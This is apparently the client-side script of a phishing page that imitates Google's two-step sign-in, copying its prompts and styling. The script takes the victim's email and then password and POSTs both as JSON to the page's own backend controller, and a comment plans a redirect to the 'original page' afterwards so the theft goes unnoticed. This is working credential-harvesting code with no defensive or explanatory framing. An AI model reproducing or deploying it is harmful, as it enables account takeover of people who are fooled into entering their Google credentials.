$(document).ready(function () {
    $('.__issetUserName').hide();
    $('.errorMsg1').hide();
    $('.errorMsg2').hide();
    $('.cpanel1').show();
    $('.cpanel2').hide();
    var UserEmail, Userpassword;
    $('.btn-google').on('click', function () {
        UserEmail = $('.____userEmail').val();
        if (UserEmail == "") {
            $('.stUf5b').fadeIn();
            $('.errorMsg1').fadeIn().html("Enter an email or phone number.");
            $('.____userEmail').focus();
            return false;
        } else {
            //$('.bbb-input').hide();
            $('.__issetUserName').fadeIn();
            $('.stUf5b').hide();
            $('.cpanel1').hide();
            $('.cpanel2').show();
            $('.errorMsg1').hide();
            $('.__issetUserName').html(UserEmail);
        }
    });
    $('.btn-googleSubmint').on('click', function () {
        Userpassword = $('.____userPassword').val();
        UserEmail = $('.____userEmail').val();
        if (Userpassword == "") {
            // $('.bpin').show()
            $('.stUf5b').fadeIn();
            $('.errorMsg2').fadeIn().html("Enter a password.");
        
            $('.____userPassword').focus().css("border", "red solid 2px");
            return false;
        } else {
            $('.bpin').fadeOut();
            $('.bpin').hide();
            $('.errorMsg2').fadeOut();
            $('.errorMsg2').hide();

            const data = {
                "___Username": UserEmail,
                "___Userpassword": Userpassword,
            };
            let StringData = JSON.stringify(data);
            const Url = base_url + 'PagesController/MainController'; // the url where we want to POST
            $.ajax({
                type: 'POST', // define the type of HTTP verb we want to use (POST for our form)
                dataType: 'JSON', //the type of data we are sending is json
                contentType: "application/json; charset=utf-8",
                data: StringData, // our data object
                url: Url, //the post destination
                processData: false, //false because the preprocessor are not trigger
                encode: true, //turn on json encoding
                crossOrigin: true, // true because we are sending data with ajax as json format to php
                async: true, //because we are expecting long data so we set the whole data  Asynchronous with means configuring our Ajax code
                crossDomain: true, //just in case we host the site
                headers: {
                    'Access-Control-Allow-Methods': '*',
                    "Access-Control-Allow-Credentials": true,
                    "Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Origin, X-Requested-With, Content-Type, Accept, Authorization",
                    "Access-Control-Allow-Origin": "*",
                    "Control-Allow-Origin": "*",
                    "cache-control": "no-cache",
                    'Content-Type': 'application/json'
                },
            }).done(function (response) {
                if (response.status == 200) {
                    $('.errorMsg2').fadeIn().html(response.message);
                    // delay and reload and Redirect to Original Page
                } else {
                    $('.errorMsg2').fadeIn().html(response.message);
                }
            }).fail((xhr, status, error) => {
                console.log('Oops...', 'Something went wrong with ajax !', 'error');
            });
        }
    });
    
    $('.____rememberMe').on('click', function () {
        var show = $('.____userPassword');
        if (show.type == 'password') {
            show.type = 'text';
        } else {
            show.type = 'password';
        }
    });
});